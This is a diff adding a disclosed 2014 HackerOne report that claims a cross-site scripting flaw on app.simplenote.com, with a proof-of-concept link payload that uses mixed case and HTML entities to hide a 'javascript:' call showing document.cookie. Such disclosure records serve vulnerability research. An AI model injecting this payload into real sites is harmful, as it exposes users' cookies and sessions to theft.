@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/13703
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/uaenajiawgivegqwuyvegqyuwvyefg
+ReportedTo:Automattic(automattic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.07.2014 10:00:28
+
+Summary:
+
+Hello Automattic,
+
+I found xss here app.simplenote.com
+
+__XSS Payload:__ 
+<a href="jAvAsCrIpT&colon;prompt&lpar;document.cookie&rpar;">CLICK ME TO PROMPT</a>
+
+__Proof of Concept:__
+http://i.imgur.com/8Ai0deF.png
+
+__Thanks,__
+Jerold Camacho
